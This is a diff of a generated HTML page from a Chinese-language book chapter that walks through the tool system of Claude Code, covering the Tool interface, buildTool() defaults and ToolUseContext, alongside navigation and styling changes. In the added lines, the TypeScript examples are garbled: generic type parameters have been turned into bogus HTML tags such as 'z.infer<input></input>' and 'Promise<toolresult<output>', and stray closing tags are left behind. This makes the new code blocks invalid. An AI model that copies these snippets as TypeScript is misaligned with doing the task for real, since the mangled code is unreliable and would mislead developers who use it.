@@ -16,6 +16,10 @@
     
             
                 
+                <link rel="stylesheet" href="gitbook/honkit-plugin-mermaid/mermaid.css">
+                
+            
+                
                 <link rel="stylesheet" href="gitbook/@honkit/honkit-plugin-highlight/website.css">
                 
             
@@ -316,169 +320,6 @@
     
 
     
-        
-        <li class="header">English Chapters</li>
-        
-        
-    
-        <li class="chapter " data-level="8.1" data-path="Chapter-01-Project-Overview-and-Architecture.html">
-            
-                <a href="Chapter-01-Project-Overview-and-Architecture.html">
-            
-                    
-                    Chapter 01 - Project Overview and Architecture
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.2" data-path="Chapter-02-Build-System-and-Startup-Flow.html">
-            
-                <a href="Chapter-02-Build-System-and-Startup-Flow.html">
-            
-                    
-                    Chapter 02 - Build System and Startup Flow
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.3" data-path="Chapter-03-Terminal-UI-Rendering-Engine.html">
-            
-                <a href="Chapter-03-Terminal-UI-Rendering-Engine.html">
-            
-                    
-                    Chapter 03 - Terminal UI Rendering Engine
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.4" data-path="Chapter-04-Event-System-and-Input-Handling.html">
-            
-                <a href="Chapter-04-Event-System-and-Input-Handling.html">
-            
-                    
-                    Chapter 04 - Event System and Input Handling
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.5" data-path="Chapter-05-Core-Conversation-Engine-QueryEngine.html">
-            
-                <a href="Chapter-05-Core-Conversation-Engine-QueryEngine.html">
-            
-                    
-                    Chapter 05 - Core Conversation Engine QueryEngine
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.6" data-path="Chapter-06-LLM-API-and-Streaming.html">
-            
-                <a href="Chapter-06-LLM-API-and-Streaming.html">
-            
-                    
-                    Chapter 06 - LLM API and Streaming
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.7" data-path="Chapter-07-Tool-System-Architecture.html">
-            
-                <a href="Chapter-07-Tool-System-Architecture.html">
-            
-                    
-                    Chapter 07 - Tool System Architecture
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.8" data-path="Chapter-08-Context-Management-and-Compression.html">
-            
-                <a href="Chapter-08-Context-Management-and-Compression.html">
-            
-                    
-                    Chapter 08 - Context Management and Compression
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.9" data-path="Chapter-09-Task-System-and-Multi-Agent.html">
-            
-                <a href="Chapter-09-Task-System-and-Multi-Agent.html">
-            
-                    
-                    Chapter 09 - Task System and Multi-Agent
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.10" data-path="Chapter-10-Team-Collaboration-and-Remote-Communication.html">
-            
-                <a href="Chapter-10-Team-Collaboration-and-Remote-Communication.html">
-            
-                    
-                    Chapter 10 - Team Collaboration and Remote Communication
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.11" data-path="Chapter-11-Plugin-Skills-and-Hook-System.html">
-            
-                <a href="Chapter-11-Plugin-Skills-and-Hook-System.html">
-            
-                    
-                    Chapter 11 - Plugin Skills and Hook System
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="8.12" data-path="Chapter-12-State-Security-and-Infrastructure.html">
-            
-                <a href="Chapter-12-State-Security-and-Infrastructure.html">
-            
-                    
-                    Chapter 12 - State Security and Infrastructure
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-    
 
     <li class="divider"></li>
 
@@ -526,7 +367,7 @@
 <h2 id="71-概述">7.1 概述</h2>
 <p>Claude Code 的工具系统是整个产品的执行引擎。模型通过工具与外部世界交互：执行命令、读写文件、搜索代码、启动子 agent。本章将从 <code>Tool</code> 泛型接口开始，逐层深入工具的注册管道、执行上下文、延迟加载机制，最后对 BashTool 和 FileEditTool 做逐行级别的源码分析。</p>
 <h3 id="代码流程图：工具调用执行流水线">代码流程图：工具调用执行流水线</h3>
-<pre><code class="lang-mermaid">flowchart TD
+<pre><code class="lang-mermaid"><div class="mermaid">flowchart TD
     A["LLM 输出 tool_use block&lt;br/&gt;{name, input}"] --&gt; B["Zod Schema 解析&lt;br/&gt;inputSchema.parse(input)"]
     B --&gt; C{{"解析成功?"}}
     C --&gt;|失败| D["返回错误消息&lt;br/&gt;给模型重试"]
@@ -564,7 +405,7 @@
     style K fill:#ffcdd2
     style U fill:#c8e6c9
     style N fill:#e8eaf6
-</code></pre>
+</div></code></pre>
 <p>核心源码文件：</p>
 <ul>
 <li><code>src/Tool.ts</code> -- Tool 泛型接口定义与 <code>buildTool()</code> 工厂函数</li>
@@ -577,13 +418,13 @@
 </ul>
 <h2 id="72-tool-泛型接口完整设计">7.2 Tool 泛型接口完整设计</h2>
 <h3 id="721-类型签名">7.2.1 类型签名</h3>
-<pre><code class="lang-typescript"><span class="hljs-comment">// src/Tool.ts</span>
-<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Tool</span>&lt;
-  <span class="hljs-title class_">Input</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnyObject</span> = <span class="hljs-title class_">AnyObject</span>,
-  <span class="hljs-title class_">Output</span> = <span class="hljs-built_in">unknown</span>,
-  P <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ToolProgressData</span> = <span class="hljs-title class_">ToolProgressData</span>,
+<pre><code class="lang-typescript">// src/Tool.ts
+export type Tool&lt;
+  Input extends AnyObject = AnyObject,
+  Output = unknown,
+  P extends ToolProgressData = ToolProgressData,
 &gt; = {
-  <span class="hljs-comment">// ... 完整字段定义</span>
+  // ... 完整字段定义
 }
 </code></pre>
 <p>三个泛型参数：</p>
@@ -615,43 +456,43 @@
 </table>
 <h3 id="722-核心字段逐一讲解">7.2.2 核心字段逐一讲解</h3>
 <p><strong>1. 标识与元数据</strong></p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
-<span class="hljs-attr">aliases</span>?: <span class="hljs-built_in">string</span>[]
-<span class="hljs-attr">searchHint</span>?: <span class="hljs-built_in">string</span>
+<pre><code class="lang-typescript">readonly name: string
+aliases?: string[]
+searchHint?: string
 </code></pre>
 <ul>
 <li><code>name</code>: 工具的主标识符，全局唯一。模型在 <code>tool_use</code> block 中通过这个名字调用工具。</li>
 <li><code>aliases</code>: 工具重命名后的向后兼容别名。<code>toolMatchesName()</code> 函数同时匹配主名和别名：</li>
 </ul>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">toolMatchesName</span>(<span class="hljs-params">
-  <span class="hljs-attr">tool</span>: { name: <span class="hljs-built_in">string</span>; aliases?: <span class="hljs-built_in">string</span>[] },
-  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>,
-</span>): <span class="hljs-built_in">boolean</span> {
-  <span class="hljs-keyword">return</span> tool.<span class="hljs-property">name</span> === name || (tool.<span class="hljs-property">aliases</span>?.<span class="hljs-title function_">includes</span>(name) ?? <span class="hljs-literal">false</span>)
+<pre><code class="lang-typescript">export function toolMatchesName(
+  tool: { name: string; aliases?: string[] },
+  name: string,
+): boolean {
+  return tool.name === name || (tool.aliases?.includes(name) ?? false)
 }
 </code></pre>
 <ul>
 <li><code>searchHint</code>: 3-10 个词的能力短语，供 ToolSearch 做关键词匹配。优先使用工具名中没有的词（如 NotebookEdit 的 hint 是 <code>'jupyter'</code>）。</li>
 </ul>
 <p><strong>2. Schema 定义</strong></p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">readonly</span> <span class="hljs-attr">inputSchema</span>: <span class="hljs-title class_">Input</span>
-<span class="hljs-keyword">readonly</span> <span class="hljs-attr">inputJSONSchema</span>?: <span class="hljs-title class_">ToolInputJSONSchema</span>
-<span class="hljs-attr">outputSchema</span>?: z.<span class="hljs-property">ZodType</span>&lt;<span class="hljs-built_in">unknown</span>&gt;
-</code></pre>
+<pre><code class="lang-typescript">readonly inputSchema: Input
+readonly inputJSONSchema?: ToolInputJSONSchema
+outputSchema?: z.ZodType<unknown>
+</unknown></code></pre>
 <ul>
 <li><code>inputSchema</code>: 用 Zod 定义的输入参数 schema。模型生成的 JSON 参数会经过这个 schema 的解析和校验。</li>
 <li><code>inputJSONSchema</code>: MCP 工具的替代方案，直接以 JSON Schema 格式指定输入（不需要经过 Zod 转换）。</li>
 <li><code>outputSchema</code>: 输出类型的 Zod schema，目前是可选的（TODO 注释表明将来会变为必需）。</li>
 </ul>
 <p><strong>3. 核心执行方法</strong></p>
-<pre><code class="lang-typescript"><span class="hljs-title function_">call</span>(
-  <span class="hljs-attr">args</span>: z.<span class="hljs-property">infer</span>&lt;<span class="hljs-title class_">Input</span>&gt;,
-  <span class="hljs-attr">context</span>: <span class="hljs-title class_">ToolUseContext</span>,
-  <span class="hljs-attr">canUseTool</span>: <span class="hljs-title class_">CanUseToolFn</span>,
-  <span class="hljs-attr">parentMessage</span>: <span class="hljs-title class_">AssistantMessage</span>,
-  <span class="hljs-attr">onProgress</span>?: <span class="hljs-title class_">ToolCallProgress</span>&lt;P&gt;,
-): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ToolResult</span>&lt;<span class="hljs-title class_">Output</span>&gt;&gt;
-</code></pre>
+<pre><code class="lang-typescript">call(
+  args: z.infer<input></input>,
+  context: ToolUseContext,
+  canUseTool: CanUseToolFn,
+  parentMessage: AssistantMessage,
+  onProgress?: ToolCallProgress<p>,
+): Promise<toolresult<output>&gt;
+</toolresult<output></p></code></pre>
 <p>这是工具的主执行函数。五个参数：</p>
 <ul>
 <li><code>args</code>: 经过 Zod schema 解析后的输入参数</li>
@@ -660,20 +501,20 @@
 <li><code>parentMessage</code>: 触发此工具调用的 assistant 消息</li>
 <li><code>onProgress</code>: 可选的进度上报回调</li>
 </ul>
-<p>返回 <code>ToolResult&lt;T&gt;</code> 类型：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ToolResult</span>&lt;T&gt; = {
-  <span class="hljs-attr">data</span>: T
-  <span class="hljs-attr">newMessages</span>?: (<span class="hljs-title class_">UserMessage</span> | <span class="hljs-title class_">AssistantMessage</span> | <span class="hljs-title class_">AttachmentMessage</span> | <span class="hljs-title class_">SystemMessage</span>)[]
-  <span class="hljs-attr">contextModifier</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">context</span>: <span class="hljs-title class_">ToolUseContext</span></span>) =&gt;</span> <span class="hljs-title class_">ToolUseContext</span>
-  <span class="hljs-attr">mcpMeta</span>?: { <span class="hljs-attr">_meta</span>?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;; <span class="hljs-attr">structuredContent</span>?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt; }
+<p>返回 <code>ToolResult<t></t></code> 类型：</p>
+<pre><code class="lang-typescript">export type ToolResult<t> = {
+  data: T
+  newMessages?: (UserMessage | AssistantMessage | AttachmentMessage | SystemMessage)[]
+  contextModifier?: (context: ToolUseContext) =&gt; ToolUseContext
+  mcpMeta?: { _meta?: Record<string, unknown="">; structuredContent?: Record<string, unknown=""> }
 }
-</code></pre>
+</string,></string,></t></code></pre>
 <p><code>contextModifier</code> 允许工具修改后续的执行上下文，但仅对非并发安全的工具生效。</p>
 <p><strong>4. 权限控制方法</strong></p>
-<pre><code class="lang-typescript">validateInput?(input, context): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ValidationResult</span>&gt;
-<span class="hljs-title function_">checkPermissions</span>(input, context): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">PermissionResult</span>&gt;
-preparePermissionMatcher?(input): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">pattern</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">boolean</span>&gt;
-</code></pre>
+<pre><code class="lang-typescript">validateInput?(input, context): Promise<validationresult>
+checkPermissions(input, context): Promise<permissionresult>
+preparePermissionMatcher?(input): Promise&lt;(pattern: string) =&gt; boolean&gt;
+</permissionresult></validationresult></code></pre>
 <p>执行顺序：<code>validateInput</code> -&gt; <code>checkPermissions</code>。</p>
 <ul>
 <li><code>validateInput</code>: 校验输入的合法性（如文件是否存在、字符串是否可找到），返回 <code>{ result: true }</code> 或包含错误信息的对象。这一步不涉及 UI 交互。</li>
@@ -681,11 +522,11 @@ preparePermissionMatcher?(input): <span class="hljs-title class_">Promise</span>
 <li><code>preparePermissionMatcher</code>: 为 hook 的 <code>if</code> 条件准备匹配器。一次解析、多次匹配，避免重复开销。</li>
 </ul>
 <p><strong>5. 行为特征声明</strong></p>
-<pre><code class="lang-typescript"><span class="hljs-title function_">isEnabled</span>(): <span class="hljs-built_in">boolean</span>
-<span class="hljs-title function_">isConcurrencySafe</span>(input): <span class="hljs-built_in">boolean</span>
-<span class="hljs-title function_">isReadOnly</span>(input): <span class="hljs-built_in">boolean</span>
-isDestructive?(input): <span class="hljs-built_in">boolean</span>
-interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="hljs-string">'block'</span>
+<pre><code class="lang-typescript">isEnabled(): boolean
+isConcurrencySafe(input): boolean
+isReadOnly(input): boolean
+isDestructive?(input): boolean
+interruptBehavior?(): 'cancel' | 'block'
 </code></pre>
 <ul>
 <li><code>isEnabled</code>: 工具是否在当前环境下可用（如某些工具仅在 ant 内部启用）。</li>
@@ -695,19 +536,19 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 <li><code>interruptBehavior</code>: 用户提交新消息时的行为。<code>'cancel'</code> 停止并丢弃结果；<code>'block'</code> 继续运行，新消息等待。默认 <code>'block'</code>。</li>
 </ul>
 <p><strong>6. 搜索与 UI 归类</strong></p>
-<pre><code class="lang-typescript">isSearchOrReadCommand?(input): { <span class="hljs-attr">isSearch</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-attr">isRead</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-attr">isList</span>?: <span class="hljs-built_in">boolean</span> }
+<pre><code class="lang-typescript">isSearchOrReadCommand?(input): { isSearch: boolean; isRead: boolean; isList?: boolean }
 </code></pre>
 <p>判断工具调用是否为搜索/读取操作，用于 UI 中的折叠显示。GrepTool 固定返回 <code>{ isSearch: true, isRead: false }</code>。BashTool 则需要解析命令字符串来判断。</p>
 <p><strong>7. 延迟加载相关</strong></p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">readonly</span> <span class="hljs-attr">shouldDefer</span>?: <span class="hljs-built_in">boolean</span>
-<span class="hljs-keyword">readonly</span> <span class="hljs-attr">alwaysLoad</span>?: <span class="hljs-built_in">boolean</span>
+<pre><code class="lang-typescript">readonly shouldDefer?: boolean
+readonly alwaysLoad?: boolean
 </code></pre>
 <ul>
 <li><code>shouldDefer</code>: 为 <code>true</code> 时，工具以 <code>defer_loading: true</code> 发送，需要通过 ToolSearch 才能调用。</li>
 <li><code>alwaysLoad</code>: 为 <code>true</code> 时，即使 ToolSearch 启用，也始终发送完整 schema。MCP 工具可通过 <code>_meta['anthropic/alwaysLoad']</code> 设置。</li>
 </ul>
 <p><strong>8. 结果大小控制</strong></p>
-<pre><code class="lang-typescript"><span class="hljs-attr">maxResultSizeChars</span>: <span class="hljs-built_in">number</span>
+<pre><code class="lang-typescript">maxResultSizeChars: number
 </code></pre>
 <p>工具结果超过此字符数时，会被持久化到磁盘，模型收到的是预览 + 文件路径。FileReadTool 设为 <code>Infinity</code>，因为持久化会导致循环（Read -&gt; 文件 -&gt; Read）。</p>
 <p><strong>9. 渲染方法族</strong></p>
@@ -751,50 +592,50 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 </tbody>
 </table>
 <p>还有两个重要的数据转换方法：</p>
-<pre><code class="lang-typescript"><span class="hljs-title function_">mapToolResultToToolResultBlockParam</span>(<span class="hljs-attr">content</span>: <span class="hljs-title class_">Output</span>, <span class="hljs-attr">toolUseID</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">ToolResultBlockParam</span>
-<span class="hljs-title function_">toAutoClassifierInput</span>(input): <span class="hljs-built_in">unknown</span>
+<pre><code class="lang-typescript">mapToolResultToToolResultBlockParam(content: Output, toolUseID: string): ToolResultBlockParam
+toAutoClassifierInput(input): unknown
 </code></pre>
 <ul>
 <li><code>mapToolResultToToolResultBlockParam</code>: 将工具结果转换为 API 可消费的 <code>ToolResultBlockParam</code> 格式。这是工具结果发回给模型的关键环节。</li>
 <li><code>toAutoClassifierInput</code>: 将输入压缩为安全分类器可用的格式。返回空字符串表示跳过分类器。</li>
 </ul>
 <h3 id="723-辅助类型">7.2.3 辅助类型</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Tools</span> = <span class="hljs-keyword">readonly</span> <span class="hljs-title class_">Tool</span>[]
+<pre><code class="lang-typescript">export type Tools = readonly Tool[]
 </code></pre>
 <p><code>Tools</code> 是只读数组类型别名，方便在代码库中跟踪工具集合的传递和过滤。</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ToolCallProgress</span>&lt;P <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ToolProgressData</span> = <span class="hljs-title class_">ToolProgressData</span>&gt; = <span class="hljs-function">(<span class="hljs-params">
-  <span class="hljs-attr">progress</span>: <span class="hljs-title class_">ToolProgress</span>&lt;P&gt;,
-</span>) =&gt;</span> <span class="hljs-built_in">void</span>
-</code></pre>
-<p>进度上报回调类型。<code>ToolProgress&lt;P&gt;</code> 包含 <code>toolUseID</code> 和类型化的 <code>data</code>。</p>
+<pre><code class="lang-typescript">export type ToolCallProgress<p extends="" toolprogressdata="ToolProgressData"> = (
+  progress: ToolProgress</p><p>,
+) =&gt; void
+</p></code></pre>
+<p>进度上报回调类型。<code>ToolProgress<p></p></code> 包含 <code>toolUseID</code> 和类型化的 <code>data</code>。</p>
 <h2 id="73-buildtool-工厂函数与默认值">7.3 buildTool() 工厂函数与默认值</h2>
 <h3 id="731-设计动机">7.3.1 设计动机</h3>
 <p>Tool 接口有 50+ 个字段/方法。如果每个工具都要实现全部方法，重复代码会很多。<code>buildTool()</code> 提供安全的默认值，让工具定义只需关注差异化的部分。</p>
 <h3 id="732-可默认的方法">7.3.2 可默认的方法</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">DefaultableToolKeys</span> =
-  | <span class="hljs-string">'isEnabled'</span>
-  | <span class="hljs-string">'isConcurrencySafe'</span>
-  | <span class="hljs-string">'isReadOnly'</span>
-  | <span class="hljs-string">'isDestructive'</span>
-  | <span class="hljs-string">'checkPermissions'</span>
-  | <span class="hljs-string">'toAutoClassifierInput'</span>
-  | <span class="hljs-string">'userFacingName'</span>
+<pre><code class="lang-typescript">type DefaultableToolKeys =
+  | 'isEnabled'
+  | 'isConcurrencySafe'
+  | 'isReadOnly'
+  | 'isDestructive'
+  | 'checkPermissions'
+  | 'toAutoClassifierInput'
+  | 'userFacingName'
 </code></pre>
 <h3 id="733-默认值定义">7.3.3 默认值定义</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOOL_DEFAULTS</span> = {
-  <span class="hljs-attr">isEnabled</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">true</span>,
-  <span class="hljs-attr">isConcurrencySafe</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_input</span>?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> <span class="hljs-literal">false</span>,
-  <span class="hljs-attr">isReadOnly</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_input</span>?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> <span class="hljs-literal">false</span>,
-  <span class="hljs-attr">isDestructive</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_input</span>?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> <span class="hljs-literal">false</span>,
-  <span class="hljs-attr">checkPermissions</span>: (
-    <span class="hljs-attr">input</span>: { [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">unknown</span> },
-    <span class="hljs-attr">_ctx</span>?: <span class="hljs-title class_">ToolUseContext</span>,
-  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">PermissionResult</span>&gt; =&gt;
-    <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">behavior</span>: <span class="hljs-string">'allow'</span>, <span class="hljs-attr">updatedInput</span>: input }),
-  <span class="hljs-attr">toAutoClassifierInput</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_input</span>?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> <span class="hljs-string">''</span>,
-  <span class="hljs-attr">userFacingName</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_input</span>?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> <span class="hljs-string">''</span>,
+<pre><code class="lang-typescript">const TOOL_DEFAULTS = {
+  isEnabled: () =&gt; true,
+  isConcurrencySafe: (_input?: unknown) =&gt; false,
+  isReadOnly: (_input?: unknown) =&gt; false,
+  isDestructive: (_input?: unknown) =&gt; false,
+  checkPermissions: (
+    input: { [key: string]: unknown },
+    _ctx?: ToolUseContext,
+  ): Promise<permissionresult> =&gt;
+    Promise.resolve({ behavior: 'allow', updatedInput: input }),
+  toAutoClassifierInput: (_input?: unknown) =&gt; '',
+  userFacingName: (_input?: unknown) =&gt; '',
 }
-</code></pre>
+</permissionresult></code></pre>
 <p>关键设计原则是 <strong>fail-closed</strong>：</p>
 <ul>
 <li><code>isConcurrencySafe</code> 默认 <code>false</code>：假设不安全，要求显式声明可并发</li>
@@ -803,44 +644,44 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 <li><code>toAutoClassifierInput</code> 默认空字符串：跳过分类器（安全相关工具必须覆写）</li>
 </ul>
 <h3 id="734-buildtool-实现">7.3.4 buildTool 实现</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> buildTool&lt;D <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnyToolDef</span>&gt;(<span class="hljs-attr">def</span>: D): <span class="hljs-title class_">BuiltTool</span>&lt;D&gt; {
-  <span class="hljs-keyword">return</span> {
-    ...<span class="hljs-variable constant_">TOOL_DEFAULTS</span>,
-    <span class="hljs-attr">userFacingName</span>: <span class="hljs-function">() =&gt;</span> def.<span class="hljs-property">name</span>,
+<pre><code class="lang-typescript">export function buildTool<d extends="" anytooldef="">(def: D): BuiltTool<d> {
+  return {
+    ...TOOL_DEFAULTS,
+    userFacingName: () =&gt; def.name,
     ...def,
-  } <span class="hljs-keyword">as</span> <span class="hljs-title class_">BuiltTool</span>&lt;D&gt;
+  } as BuiltTool<d>
 }
-</code></pre>
+</d></d></d></code></pre>
 <p>展开顺序：<code>TOOL_DEFAULTS</code> -&gt; <code>{ userFacingName: () =&gt; def.name }</code> -&gt; <code>def</code>。后面的属性覆盖前面的，所以工具定义中的任何覆写都会生效。<code>userFacingName</code> 在默认值之后、<code>def</code> 之前展开，意味着如果工具没有指定 <code>userFacingName</code>，默认使用工具名。</p>
-<p>类型层面，<code>BuiltTool&lt;D&gt;</code> 精确镜像运行时的 spread 语义：对于每个 defaultable key，如果 <code>D</code> 提供了，用 <code>D</code> 的类型；否则用 <code>TOOL_DEFAULTS</code> 的类型。</p>
+<p>类型层面，<code>BuiltTool<d></d></code> 精确镜像运行时的 spread 语义：对于每个 defaultable key，如果 <code>D</code> 提供了，用 <code>D</code> 的类型；否则用 <code>TOOL_DEFAULTS</code> 的类型。</p>
 <h2 id="74-toolusecontext-执行上下文">7.4 ToolUseContext 执行上下文</h2>
 <p><code>ToolUseContext</code> 是工具执行时的全部运行时状态。这是一个庞大的类型，这里按功能分组讲解关键字段。</p>
 <h3 id="741-配置选项">7.4.1 配置选项</h3>
-<pre><code class="lang-typescript"><span class="hljs-attr">options</span>: {
-  <span class="hljs-attr">commands</span>: <span class="hljs-title class_">Command</span>[]
-  <span class="hljs-attr">debug</span>: <span class="hljs-built_in">boolean</span>
-  <span class="hljs-attr">mainLoopModel</span>: <span class="hljs-built_in">string</span>
-  <span class="hljs-attr">tools</span>: <span class="hljs-title class_">Tools</span>
-  <span class="hljs-attr">verbose</span>: <span class="hljs-built_in">boolean</span>
-  <span class="hljs-attr">thinkingConfig</span>: <span class="hljs-title class_">ThinkingConfig</span>
-  <span class="hljs-attr">mcpClients</span>: <span class="hljs-title class_">MCPServerConnection</span>[]
-  <span class="hljs-attr">mcpResources</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">ServerResource</span>[]&gt;
-  <span class="hljs-attr">isNonInteractiveSession</span>: <span class="hljs-built_in">boolean</span>
-  <span class="hljs-attr">agentDefinitions</span>: <span class="hljs-title class_">AgentDefinitionsResult</span>
-  <span class="hljs-attr">maxBudgetUsd</span>?: <span class="hljs-built_in">number</span>
-  <span class="hljs-attr">customSystemPrompt</span>?: <span class="hljs-built_in">string</span>
-  <span class="hljs-attr">appendSystemPrompt</span>?: <span class="hljs-built_in">string</span>
-  <span class="hljs-attr">querySource</span>?: <span class="hljs-title class_">QuerySource</span>
-  <span class="hljs-attr">refreshTools</span>?: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Tools</span>
+<pre><code class="lang-typescript">options: {
+  commands: Command[]
+  debug: boolean
+  mainLoopModel: string
+  tools: Tools
+  verbose: boolean
+  thinkingConfig: ThinkingConfig
+  mcpClients: MCPServerConnection[]
+  mcpResources: Record<string, serverresource[]="">
+  isNonInteractiveSession: boolean
+  agentDefinitions: AgentDefinitionsResult
+  maxBudgetUsd?: number
+  customSystemPrompt?: string
+  appendSystemPrompt?: string
+  querySource?: QuerySource
+  refreshTools?: () =&gt; Tools
 }
-</code></pre>
+</string,></code></pre>
 <p><code>refreshTools</code> 是一个回调，用于在 MCP 服务器中途连接后获取最新的工具列表。</p>
 <h3 id="742-状态管理">7.4.2 状态管理</h3>
-<pre><code class="lang-typescript"><span class="hljs-attr">abortController</span>: <span class="hljs-title class_">AbortController</span>
-<span class="hljs-attr">readFileState</span>: <span class="hljs-title class_">FileStateCache</span>
-<span class="hljs-title function_">getAppState</span>(): <span class="hljs-title class_">AppState</span>
-<span class="hljs-title function_">setAppState</span>(<span class="hljs-attr">f</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">prev</span>: <span class="hljs-title class_">AppState</span></span>) =&gt;</span> <span class="hljs-title class_">AppState</span>): <span class="hljs-built_in">void</span>
-<span class="hljs-attr">setAppStateForTasks</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">f</span>: (prev: AppState) =&gt; <span class="hljs-title class_">AppState</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
+<pre><code class="lang-typescript">abortController: AbortController
+readFileState: FileStateCache
+getAppState(): AppState
+setAppState(f: (prev: AppState) =&gt; AppState): void
+setAppStateForTasks?: (f: (prev: AppState) =&gt; AppState) =&gt; void
 </code></pre>
 <ul>
 <li><code>abortController</code>: 用于取消正在执行的工具调用。</li>
@@ -848,20 +689,20 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 <li><code>setAppStateForTasks</code>: 任务级别的状态更新，始终到达根 store。对于嵌套子 agent，普通 <code>setAppState</code> 是 no-op，但 <code>setAppStateForTasks</code> 始终有效。</li>
 </ul>
 <h3 id="743-消息与文件追踪">7.4.3 消息与文件追踪</h3>
-<pre><code class="lang-typescript"><span class="hljs-attr">messages</span>: <span class="hljs-title class_">Message</span>[]
-<span class="hljs-attr">updateFileHistoryState</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">updater</span>: (prev: FileHistoryState) =&gt; <span class="hljs-title class_">FileHistoryState</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
-<span class="hljs-attr">updateAttributionState</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">updater</span>: (prev: AttributionState) =&gt; <span class="hljs-title class_">AttributionState</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
-<span class="hljs-attr">contentReplacementState</span>?: <span class="hljs-title class_">ContentReplacementState</span>
+<pre><code class="lang-typescript">messages: Message[]
+updateFileHistoryState: (updater: (prev: FileHistoryState) =&gt; FileHistoryState) =&gt; void
+updateAttributionState: (updater: (prev: AttributionState) =&gt; AttributionState) =&gt; void
+contentReplacementState?: ContentReplacementState
 </code></pre>
 <ul>
 <li><code>messages</code>: 当前对话的完整消息列表。</li>
 <li><code>contentReplacementState</code>: 工具结果预算的内容替换状态。用于在 query.ts 中应用聚合工具结果预算（Tool Result Budget，见第8章）。</li>
 </ul>
 <h3 id="744-ui-交互">7.4.4 UI 交互</h3>
-<pre><code class="lang-typescript"><span class="hljs-attr">setToolJSX</span>?: <span class="hljs-title class_">SetToolJSXFn</span>
-<span class="hljs-attr">addNotification</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">notif</span>: <span class="hljs-title class_">Notification</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
